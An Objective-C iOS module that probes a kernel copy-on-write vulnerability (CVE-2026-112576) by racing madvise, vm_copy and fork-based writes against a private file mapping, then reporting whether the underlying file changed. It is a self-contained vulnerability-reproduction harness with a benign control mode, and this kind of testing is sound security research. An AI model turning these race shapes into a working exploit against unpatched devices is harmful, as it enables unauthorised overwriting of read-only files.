#import "KPAuditCoW112576Module.h"
#import "KPLog.h"
#import <mach/mach.h>
#import <pthread.h>
#import <sys/mman.h>
#import <sys/wait.h>
#import <unistd.h>
#import <fcntl.h>

@interface KPAuditCoW112576Module ()
@property (nonatomic, assign) BOOL armed;
@property (nonatomic, copy) NSString *identifier;
@property (nonatomic, copy) NSString *title;
@property (nonatomic, copy) NSString *subtitle;
@property (nonatomic, copy) NSString *icon;
@property (nonatomic, assign) KPTestSection section;
@end

@implementation KPAuditCoW112576Module

- (instancetype)initWithArmed:(BOOL)armed {
    self = [super init];
    if (self) {
        _armed = armed;
        _identifier = armed ? @"cow112576.armed" : @"cow112576.baseline";
        _title = armed ? @"Kernel CoW integrity (armed)" : @"Kernel CoW (baseline)";
        _subtitle = armed
            ? @"CVE-2026-112576: 4 CoW overwrite shapes, 256 iterations each, pread verify"
            : @"Benign private copy sanity: copy mutates destination only";
        _icon = armed ? @"doc.on.doc" : @"square.stack.3d.down.right";
        _section = KPTestSectionKernelProbes;
    }
    return self;
}

#pragma mark - Setup

static const size_t kKPPageSize = 0x4000;

- (nullable NSString *)writeSourceFileWithPattern {
    NSString *path = [NSTemporaryDirectory() stringByAppendingPathComponent:@"kp-cow-src.bin"];
    NSMutableData *data = [NSMutableData dataWithLength:kKPPageSize];
    uint8_t *bytes = data.mutableBytes;
    for (size_t i = 0; i < kKPPageSize; i++) bytes[i] = (uint8_t)(i & 0xFF);
    if (![data writeToFile:path atomically:YES]) return nil;
    return path;
}

- (BOOL)fileStillOriginalAtPath:(NSString *)path {
    NSData *data = [NSData dataWithContentsOfFile:path options:NSDataReadingUncached error:NULL];
    if (data.length != kKPPageSize) return NO;
    const uint8_t *bytes = data.bytes;
    for (size_t i = 0; i < kKPPageSize; i++) {
        if (bytes[i] != (uint8_t)(i & 0xFF)) return NO;
    }
    return YES;
}

#pragma mark - CoW shapes

typedef struct {
    volatile int stop;
    char *mapping;
    size_t length;
} KPCoWRaceArgs;

static void *KPCoWMadviseLoop(void *arg) {
    KPCoWRaceArgs *args = (KPCoWRaceArgs *)arg;
    while (!args->stop) {
        madvise(args->mapping, args->length, MADV_FREE);
        madvise(args->mapping, args->length, MADV_DONTNEED);
        madvise(args->mapping, args->length, MADV_FREE_REUSABLE);
    }
    return NULL;
}

static void *KPCoWWriteLoop(void *arg) {
    KPCoWRaceArgs *args = (KPCoWRaceArgs *)arg;
    char value = 0x41;
    while (!args->stop) {
        memset(args->mapping, value, 16);
    }
    return NULL;
}

// Shape 1: mach_vm_copy + MADV_FREE_REUSABLE (original hunter hypothesis)
- (NSDictionary *)runShapeMachVMCopyAtPath:(NSString *)path iterations:(uint32_t)iters {
    int fd = open(path.fileSystemRepresentation, O_RDWR);
    if (fd < 0) return @{@"status": @"OPEN_FAILED", @"errno": @(errno)};
    void *src = mmap(NULL, kKPPageSize, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0);
    if (src == MAP_FAILED) {
        close(fd);
        return @{@"status": @"MMAP_FAILED", @"errno": @(errno)};
    }
    uint32_t changed = 0;
    for (uint32_t i = 0; i < iters; i++) {
        mach_vm_address_t dst = 0;
        kern_return_t kr = mach_vm_allocate(mach_task_self(), &dst, kKPPageSize, VM_FLAGS_ANYWHERE);
        if (kr != KERN_SUCCESS) break;
        mach_vm_copy(mach_task_self(), (mach_vm_address_t)src, kKPPageSize, dst);
        madvise((void *)dst, kKPPageSize, MADV_FREE_REUSABLE);
        memset((void *)dst, 0x42, 64);
        mach_vm_deallocate(mach_task_self(), dst, kKPPageSize);
        if (![self fileStillOriginalAtPath:path]) { changed++; break; }
    }
    munmap(src, kKPPageSize);
    close(fd);
    return @{@"shape": @"mach_vm_copy+MADV_FREE_REUSABLE", @"iterations": @(iters),
             @"file_changed": @(changed > 0)};
}

// Shape 2: file-backed MAP_PRIVATE + concurrent madvise/write threads (dirty-CoW)
- (NSDictionary *)runShapeThreadedAtPath:(NSString *)path iterations:(uint32_t)iters {
    int fd = open(path.fileSystemRepresentation, O_RDWR);
    if (fd < 0) return @{@"status": @"OPEN_FAILED", @"errno": @(errno)};
    void *src = mmap(NULL, kKPPageSize, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0);
    if (src == MAP_FAILED) {
        close(fd);
        return @{@"status": @"MMAP_FAILED", @"errno": @(errno)};
    }
    KPCoWRaceArgs args = {0, (char *)src, kKPPageSize};
    pthread_t tMadvise, tWrite;
    pthread_create(&tMadvise, NULL, KPCoWMadviseLoop, &args);
    pthread_create(&tWrite, NULL, KPCoWWriteLoop, &args);
    for (uint32_t i = 0; i < iters; i++) {
        if (![self fileStillOriginalAtPath:path]) break;
        usleep(200);
    }
    args.stop = 1;
    pthread_join(tMadvise, NULL);
    pthread_join(tWrite, NULL);
    BOOL changed = ![self fileStillOriginalAtPath:path];
    munmap(src, kKPPageSize);
    close(fd);
    return @{@"shape": @"MAP_PRIVATE+madvise/write-threads", @"iterations": @(iters),
             @"file_changed": @(changed)};
}

// Shape 3: vm_copy (BSD) + MADV_DONTNEED
- (NSDictionary *)runShapeVMCopyAtPath:(NSString *)path iterations:(uint32_t)iters {
    int fd = open(path.fileSystemRepresentation, O_RDWR);
    if (fd < 0) return @{@"status": @"OPEN_FAILED", @"errno": @(errno)};
    void *src = mmap(NULL, kKPPageSize, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0);
    void *dst = mmap(NULL, kKPPageSize, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANON, -1, 0);
    if (src == MAP_FAILED || dst == MAP_FAILED) {
        if (src != MAP_FAILED) munmap(src, kKPPageSize);
        if (dst != MAP_FAILED) munmap(dst, kKPPageSize);
        close(fd);
        return @{@"status": @"MMAP_FAILED", @"errno": @(errno)};
    }
    uint32_t changed = 0;
    for (uint32_t i = 0; i < iters; i++) {
        vm_copy(mach_task_self(), (vm_address_t)src, kKPPageSize, (vm_address_t)dst);
        madvise(dst, kKPPageSize, MADV_DONTNEED);
        memset(dst, 0x43, 64);
        if (![self fileStillOriginalAtPath:path]) { changed++; break; }
    }
    munmap(src, kKPPageSize);
    munmap(dst, kKPPageSize);
    close(fd);
    return @{@"shape": @"vm_copy+MADV_DONTNEED", @"iterations": @(iters),
             @"file_changed": @(changed > 0)};
}

// Shape 4: fork() child writes through inherited private mapping (classic CoW)
- (NSDictionary *)runShapeForkAtPath:(NSString *)path iterations:(uint32_t)iters {
    int fd = open(path.fileSystemRepresentation, O_RDWR);
    if (fd < 0) return @{@"status": @"OPEN_FAILED", @"errno": @(errno)};
    void *src = mmap(NULL, kKPPageSize, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0);
    if (src == MAP_FAILED) {
        close(fd);
        return @{@"status": @"MMAP_FAILED", @"errno": @(errno)};
    }
    uint32_t changed = 0;
    for (uint32_t i = 0; i < iters; i++) {
        pid_t pid = fork();
        if (pid == 0) {
            memset(src, 0x44, 256);
            madvise(src, kKPPageSize, MADV_FREE);
            _exit(0);
        } else if (pid > 0) {
            int status = 0;
            waitpid(pid, &status, 0);
        }
        if (![self fileStillOriginalAtPath:path]) { changed++; break; }
    }
    munmap(src, kKPPageSize);
    close(fd);
    return @{@"shape": @"fork()+child-write", @"iterations": @(iters),
             @"file_changed": @(changed > 0)};
}

#pragma mark - Report

- (NSString *)runReport {
    NSMutableString *report = [NSMutableString string];
    [report appendString:@"=== KexProofV4 audit · CVE-2026-112576 · Kernel CoW ===\n"];
    [report appendString:@"Apple 149230: 'unexpected changes to copy-on-write memory',\n"];
    [report appendString:@"fixed with improved handling of copy-on-write pages (fixed 27.2).\n"];
    [report appendString:@"No syscall sequence is published — this audit runs 4 shapes.\n"];
    [report appendFormat:@"Target: iOS %@\n", UIDevice.currentDevice.systemVersion];

    NSString *path = [self writeSourceFileWithPattern];
    if (!path) {
        [report appendString:@"VERDICT: NOT_RUN (source file failed)\n"];
        return report;
    }

    uint32_t iters = self.armed ? 256 : 8;
    if (!self.armed) {
        // Benign control: private copy must NOT touch the file.
        int fd = open(path.fileSystemRepresentation, O_RDWR);
        void *src = mmap(NULL, kKPPageSize, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0);
        memset(src, 0x99, 128);
        munmap(src, kKPPageSize);
        close(fd);
        [report appendFormat:@"baseline-private-copy file_unchanged=%d\n",
            [self fileStillOriginalAtPath:path]];
        [report appendString:@"\nVERDICT: SURVIVED (control)\n"];
        return report;
    }

    [report appendFormat:@"%@\n", [self runShapeMachVMCopyAtPath:path iterations:iters]];
    [report appendFormat:@"%@\n", [self runShapeVMCopyAtPath:path iterations:iters]];
    [report appendFormat:@"%@\n", [self runShapeThreadedAtPath:path iterations:iters]];
    [report appendFormat:@"%@\n", [self runShapeForkAtPath:path iterations:iters]];

    [report appendString:@"\nVERDICT: "];
    [report appendString:[self fileStillOriginalAtPath:path] ? @"NOT_REPRODUCED\n" : @"REPRODUCED\n"];
    [report appendString:
     @"Interpretation: a clean pread round means THESE four shapes and THESE\n"
     @"iterations did not move the file. It does not close CVE-2026-112576:\n"
     @"the affected CoW path (Pedro Pinho) is unpublished and may involve\n"
     @"compressed memory / vm_deactivate / object-cache pressure rather than\n"
     @"plain madvise races.\n"
     @"Decisive next step: diff the 27.0.1 vs 27.2 vm_object_copy_slowly and\n"
     @"vm_fault_page families and target the exact changed branch.\n"];
    return report;
}

@end
